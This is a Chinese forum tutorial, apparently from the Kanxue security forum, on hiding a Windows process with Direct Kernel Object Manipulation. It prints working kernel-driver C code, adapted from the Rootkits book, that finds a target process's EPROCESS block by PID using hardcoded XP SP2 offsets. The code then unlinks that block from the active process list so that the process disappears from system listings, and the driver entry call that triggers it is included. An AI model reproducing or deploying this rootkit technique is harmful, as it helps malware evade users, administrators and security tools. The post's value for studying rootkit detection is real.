
# DKOM Benefits and Drawbacks

> 原文：[`www.pediy.com/kssd/pediy10/65806.html`](https://www.pediy.com/kssd/pediy10/65806.html)

科普了...大侠飘过....

本人还很菜..有写错的地方希望大家多指点![](img/f43c1e514327696dccbb0da997496b2a.jpg "扮鬼脸")

感觉这样隐藏进程比 `Hook ZwQuerySystemInformation` 工序上简单很多，所以 BSOD 的几率也要小了。不过仍然逃不过 IS 的法眼...

代码基本是 copy `Rootkits: Subverting the Windows Kernel` 加了点注释。几下笔记。

在 win 中，每个进程都有一个 `EPROCESS` 结构，其中引用了一个双向链表，遍历这个链表，就能列出 win 当前活动进程。

下面是定义

代码:

```
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

`FLINK` 指向当前进程的前方进程，`BLINK` 则指向后方进程。

所以，我们要通过进程的 `PID` 定位到链表并且把要隐藏的进程从链表中断开。

![](img/ff47b85b8fa715dab6ae0d051d5d770a.jpg)

我们要找到指定进程所在的进程链表，要经历如图的过程。

代码:

```
ULONG FindProcessEPROC (ULONG terminate_PID)
{
//这个函数用来获得指定 PID 的 EPROCESS 偏移
PLIST_ENTRY plist_active_procs;

ULONG eproc;
ULONG PIDOFFSET,current_PID,start_PID, i_count,FLINKOFFSET;

eproc   = 0x00000000;
PIDOFFSET = 0x84;   //SP2
FLINKOFFSET = 0x88;
current_PID = 0;
start_PID   = 0;
i_count = 0;


if (terminate_PID == 0)

   return terminate_PID;

// Get the address of the current EPROCESS

eproc = (ULONG) PsGetCurrentProcess();   

start_PID = *((ULONG *)(eproc+PIDOFFSET)); //PID

current_PID = start_PID;

while(1)
{
   if(terminate_PID == current_PID) // found
    return eproc;
   else if((i_count >= 1) && (start_PID == current_PID))
   {
    //当整个循环都遍历完一圈却没有找到这个 PID 的时候 才会出现这种情况

    return 0x00000000;

   }
   else { // Advance in the list.

    plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);   //LIST
    eproc = (ULONG) plist_active_procs->Flink;                     //the next list entry
    eproc = eproc - FLINKOFFSET;                                    //the next EPROCESS
    current_PID = *((ULONG *)(eproc+PIDOFFSET));         //THE NEXT PID
    i_count++;

    }
}

}
```

上面这个函数，首先 `PsGetCurrentProcess();`   可以到达当前进程 `EPROCESS` `EPROCESS` 中保存了进程 `PID`，win sp2 中，`PID` 的偏移是 `0x84` `FLINK` 的偏移是 `0x88`。

下面我们就要断开这个链表。

![](img/31dfab957078c16f5f970276f8cb1255.jpg)

代码:

```
NTSTATUS HideProc()
{

PLIST_ENTRY plist_active_procs;
ULONG FLINKOFFSET,eproc;
// Find the EPROCESS to hide.

eproc = FindProcessEPROC(3248);
FLINKOFFSET = 0x88;

if (eproc == 0x00000000)
{
   

   DbgPrint("can't find the eproc!!");

   return STATUS_INVALID_PARAMETER;
}
plist_active_procs = (LIST_ENTRY *)(eproc+FLINKOFFSET);

// Change the FLINK and BLINK of the rearward and forward EPROCESS blocks.

*((ULONG *)plist_active_procs->Blink) = (ULONG) plist_active_procs->Flink; //动作一

*((ULONG *)plist_active_procs->Flink+1) = (ULONG) plist_active_procs->Blink; //动作二

// Change the FLINK and BLINK of the process we are hiding so that when

// it is dereferenced, it points to a valid memory region.

plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink);

plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink);

//这里一定要把 EPROCESS 指向其自身 不然 BSOD 郁闷死你

return STATUS_SUCCESS;

}
```

怎么断开双向链表，当初学 C 的时候都有讲..所以不多写...

最后

```
plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink);
plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink);
```

倒是要注意一下，Greg Hoglund 的书中写道，如果不把被隐藏进程的 `EPROCESS` 指向其自身，那么 `PspExitProcess` 的调用就会无效 so...BSOD...

最后，只需在 `DRIVER ENTRY` 中这样调用

代码:

```
if(STATUS_SUCCESS == HideProc())
   DbgPrint("haha hide ok!");
```

IS 中有显示红字的即是。

![](img/d7d28718559b9520c0dea62d55d7fedc.jpg)

PS:六一儿童节快乐....![](img/8e0d77ee22c3d8438aad7d42c7829e53.jpg "使眼色")

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `Code.rar`

 |
